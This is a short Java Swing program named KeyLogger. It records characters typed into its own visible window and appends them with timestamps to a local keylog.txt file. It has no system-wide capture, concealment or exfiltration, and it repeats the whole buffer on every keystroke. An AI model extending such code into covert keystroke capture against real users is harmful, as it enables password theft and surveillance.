import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import javax.swing.JFrame;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;

public class KeyLogger extends JFrame implements KeyListener {

    private StringBuilder log = new StringBuilder(); // Stores keystrokes

    public KeyLogger() {
        // Set up the JFrame
        this.setTitle("KeyLogger");
        this.setSize(400, 200);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.addKeyListener(this); // Add the key listener to the frame
    }

    // This method is called whenever a key is typed
    @Override
    public void keyTyped(KeyEvent e) {
        // Log each character typed
        char keyChar = e.getKeyChar();
        
        
       
        
        log.append(keyChar);
        writeToFile(log.toString());
    }

    @Override
    public void keyPressed(KeyEvent e) {
        // Handle key press events (if necessary)
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Handle key release events (if necessary)
    }

    // Write the log data to a file
    private void writeToFile(String data) {
        try (FileWriter writer = new FileWriter("keylog.txt", true)) {
            writer.write(LocalDateTime.now() + ": " + data + "\n");
        } catch (IOException ex) {
            System.out.println("Error writing to file: " + ex.getMessage());
        }
    }

    
   

    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
        keyLogger.setVisible(true);
    }
}